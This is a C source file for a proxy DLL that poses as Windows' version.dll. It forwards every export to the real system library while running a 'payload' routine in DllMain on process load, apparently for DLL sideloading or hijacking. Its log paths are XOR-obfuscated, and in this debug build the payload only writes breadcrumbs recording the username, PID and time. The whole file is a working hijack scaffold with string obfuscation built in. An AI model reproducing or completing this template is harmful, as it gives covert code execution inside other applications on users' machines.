/*
 * version_v5_debug.c -- Debug breadcrumb proxy
 * Writes a breadcrumb file IMMEDIATELY in DllMain before any other work.
 * If breadcrumb appears: DllMain executes, issue is in init/payload.
 * If no breadcrumb: Windows loader never loads our DLL.
 */

#include <windows.h>

static HMODULE g_hReal = NULL;

typedef BOOL  (WINAPI *t1)(LPCSTR, DWORD, DWORD, LPVOID);
typedef BOOL  (WINAPI *t2)(DWORD, HANDLE);
typedef BOOL  (WINAPI *t3)(DWORD, LPCSTR, DWORD, DWORD, LPVOID);
typedef BOOL  (WINAPI *t4)(DWORD, LPCWSTR, DWORD, DWORD, LPVOID);
typedef DWORD (WINAPI *t5)(LPCSTR, LPDWORD);
typedef DWORD (WINAPI *t6)(DWORD, LPCSTR, LPDWORD);
typedef DWORD (WINAPI *t7)(DWORD, LPCWSTR, LPDWORD);
typedef DWORD (WINAPI *t8)(LPCWSTR, LPDWORD);
typedef BOOL  (WINAPI *t9)(LPCWSTR, DWORD, DWORD, LPVOID);
typedef DWORD (WINAPI *tA)(DWORD, LPCSTR, LPCSTR, LPCSTR, LPSTR, PUINT, LPSTR, PUINT);
typedef DWORD (WINAPI *tB)(DWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPWSTR, PUINT, LPWSTR, PUINT);
typedef DWORD (WINAPI *tC)(DWORD, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPSTR, PUINT);
typedef DWORD (WINAPI *tD)(DWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPWSTR, PUINT);
typedef DWORD (WINAPI *tE)(DWORD, LPSTR, DWORD);
typedef DWORD (WINAPI *tF)(DWORD, LPWSTR, DWORD);
typedef BOOL  (WINAPI *tG)(LPCVOID, LPCSTR, LPVOID*, PUINT);
typedef BOOL  (WINAPI *tH)(LPCVOID, LPCWSTR, LPVOID*, PUINT);

static t1 f1; static t2 f2; static t3 f3; static t4 f4;
static t5 f5; static t6 f6; static t7 f7; static t8 f8;
static t9 f9; static tA fA; static tB fB; static tC fC;
static tD fD; static tE fE; static tF fF; static tG fG;
static tH fH;

/* XOR-encoded debug log paths — key 0x41 */
/* "C:\Windows\Temp\cheyanne_debug.log" (31) */
static const unsigned char xDbgPath1[] = {
    0x02, 0x7B, 0x1D, 0x16, 0x28, 0x2F, 0x25, 0x2E, 0x36, 0x32,
    0x1D, 0x15, 0x24, 0x2C, 0x31, 0x1D, 0x37, 0x20, 0x25, 0x24,
    0x33, 0x1E, 0x25, 0x24, 0x23, 0x34, 0x26, 0x6F, 0x2D, 0x2E,
    0x26
};
#define xDbgPath1_LEN 31
/* "C:\Users\Public\cheyanne_debug.log" (31) */
static const unsigned char xDbgPath2[] = {
    0x02, 0x7B, 0x1D, 0x14, 0x32, 0x24, 0x33, 0x32, 0x1D, 0x11,
    0x34, 0x23, 0x2D, 0x28, 0x22, 0x1D, 0x37, 0x20, 0x25, 0x24,
    0x33, 0x1E, 0x25, 0x24, 0x23, 0x34, 0x26, 0x6F, 0x2D, 0x2E,
    0x26
};
#define xDbgPath2_LEN 31

static void xd41(unsigned char *buf, const unsigned char *enc, int len) {
    int i; for (i = 0; i < len; i++) buf[i] = enc[i] ^ 0x41; buf[len] = 0;
}

static void breadcrumb(const char *tag)
{
    HANDLE h;
    DWORD w;
    char b[512];
    int n;
    SYSTEMTIME t;
    char u[64];
    DWORD ul = 64;
    DWORD pid = GetCurrentProcessId();
    DWORD err;
    unsigned char p[64];

    GetLocalTime(&t);
    GetUserNameA(u, &ul);

    n = wsprintfA(b, "[%04d%02d%02d_%02d%02d%02d] PID=%lu USER=%s TAG=%s\r\n",
        t.wYear, t.wMonth, t.wDay, t.wHour, t.wMinute, t.wSecond,
        pid, u, tag);

    xd41(p, xDbgPath1, xDbgPath1_LEN);
    h = CreateFileA((char *)p,
        GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    SecureZeroMemory(p, sizeof(p));
    if (h != INVALID_HANDLE_VALUE) {
        SetFilePointer(h, 0, NULL, FILE_END);
        WriteFile(h, b, n, &w, NULL);
        CloseHandle(h);
    } else {
        err = GetLastError();
        n = wsprintfA(b, "BREADCRUMB_FAIL err=%lu pid=%lu user=%s tag=%s\r\n",
            err, pid, u, tag);
        xd41(p, xDbgPath2, xDbgPath2_LEN);
        h = CreateFileA((char *)p,
            GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
            OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        SecureZeroMemory(p, sizeof(p));
        if (h != INVALID_HANDLE_VALUE) {
            SetFilePointer(h, 0, NULL, FILE_END);
            WriteFile(h, b, n, &w, NULL);
            CloseHandle(h);
        }
    }
}

static BOOL init(void)
{
    WCHAR p[MAX_PATH];
    breadcrumb("INIT_START");
    GetSystemDirectoryW(p, MAX_PATH);
    lstrcatW(p, L"\\version.dll");
    g_hReal = LoadLibraryW(p);
    if (!g_hReal) {
        char eb[64];
        wsprintfA(eb, "INIT_LOADLIB_FAIL_%lu", GetLastError());
        breadcrumb(eb);
        return FALSE;
    }
    breadcrumb("INIT_LOADLIB_OK");
    f1=(t1)GetProcAddress(g_hReal,"GetFileVersionInfoA");
    f2=(t2)GetProcAddress(g_hReal,"GetFileVersionInfoByHandle");
    f3=(t3)GetProcAddress(g_hReal,"GetFileVersionInfoExA");
    f4=(t4)GetProcAddress(g_hReal,"GetFileVersionInfoExW");
    f5=(t5)GetProcAddress(g_hReal,"GetFileVersionInfoSizeA");
    f6=(t6)GetProcAddress(g_hReal,"GetFileVersionInfoSizeExA");
    f7=(t7)GetProcAddress(g_hReal,"GetFileVersionInfoSizeExW");
    f8=(t8)GetProcAddress(g_hReal,"GetFileVersionInfoSizeW");
    f9=(t9)GetProcAddress(g_hReal,"GetFileVersionInfoW");
    fA=(tA)GetProcAddress(g_hReal,"VerFindFileA");
    fB=(tB)GetProcAddress(g_hReal,"VerFindFileW");
    fC=(tC)GetProcAddress(g_hReal,"VerInstallFileA");
    fD=(tD)GetProcAddress(g_hReal,"VerInstallFileW");
    fE=(tE)GetProcAddress(g_hReal,"VerLanguageNameA");
    fF=(tF)GetProcAddress(g_hReal,"VerLanguageNameW");
    fG=(tG)GetProcAddress(g_hReal,"VerQueryValueA");
    fH=(tH)GetProcAddress(g_hReal,"VerQueryValueW");
    breadcrumb("INIT_RESOLVE_OK");
    return TRUE;
}

static void payload(void)
{
    breadcrumb("PAYLOAD_EXEC");
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID p)
{
    (void)h; (void)p;
    if (r == DLL_PROCESS_ATTACH) {
        breadcrumb("DLLMAIN_ATTACH");
        DisableThreadLibraryCalls(h);
        if (!init()) return FALSE;
        payload();
        breadcrumb("DLLMAIN_COMPLETE");
    } else if (r == DLL_PROCESS_DETACH && g_hReal) {
        breadcrumb("DLLMAIN_DETACH");
        FreeLibrary(g_hReal);
    }
    return TRUE;
}

BOOL WINAPI vp_GetFileVersionInfoA(LPCSTR a, DWORD b, DWORD c, LPVOID d) { return f1(a,b,c,d); }
BOOL WINAPI vp_GetFileVersionInfoByHandle(DWORD a, HANDLE b) { return f2(a,b); }
BOOL WINAPI vp_GetFileVersionInfoExA(DWORD a, LPCSTR b, DWORD c, DWORD d, LPVOID e) { return f3(a,b,c,d,e); }
BOOL WINAPI vp_GetFileVersionInfoExW(DWORD a, LPCWSTR b, DWORD c, DWORD d, LPVOID e) { return f4(a,b,c,d,e); }
DWORD WINAPI vp_GetFileVersionInfoSizeA(LPCSTR a, LPDWORD b) { return f5(a,b); }
DWORD WINAPI vp_GetFileVersionInfoSizeExA(DWORD a, LPCSTR b, LPDWORD c) { return f6(a,b,c); }
DWORD WINAPI vp_GetFileVersionInfoSizeExW(DWORD a, LPCWSTR b, LPDWORD c) { return f7(a,b,c); }
DWORD WINAPI vp_GetFileVersionInfoSizeW(LPCWSTR a, LPDWORD b) { return f8(a,b); }
BOOL WINAPI vp_GetFileVersionInfoW(LPCWSTR a, DWORD b, DWORD c, LPVOID d) { return f9(a,b,c,d); }
DWORD WINAPI vp_VerFindFileA(DWORD a, LPCSTR b, LPCSTR c, LPCSTR d, LPSTR e, PUINT f, LPSTR g, PUINT i) { return fA(a,b,c,d,e,f,g,i); }
DWORD WINAPI vp_VerFindFileW(DWORD a, LPCWSTR b, LPCWSTR c, LPCWSTR d, LPWSTR e, PUINT f, LPWSTR g, PUINT i) { return fB(a,b,c,d,e,f,g,i); }
DWORD WINAPI vp_VerInstallFileA(DWORD a, LPCSTR b, LPCSTR c, LPCSTR d, LPCSTR e, LPCSTR f, LPSTR g, PUINT i) { return fC(a,b,c,d,e,f,g,i); }
DWORD WINAPI vp_VerInstallFileW(DWORD a, LPCWSTR b, LPCWSTR c, LPCWSTR d, LPCWSTR e, LPCWSTR f, LPWSTR g, PUINT i) { return fD(a,b,c,d,e,f,g,i); }
DWORD WINAPI vp_VerLanguageNameA(DWORD a, LPSTR b, DWORD c) { return fE(a,b,c); }
DWORD WINAPI vp_VerLanguageNameW(DWORD a, LPWSTR b, DWORD c) { return fF(a,b,c); }
BOOL WINAPI vp_VerQueryValueA(LPCVOID a, LPCSTR b, LPVOID *c, PUINT d) { return fG(a,b,c,d); }
BOOL WINAPI vp_VerQueryValueW(LPCVOID a, LPCWSTR b, LPVOID *c, PUINT d) { return fH(a,b,c,d); }
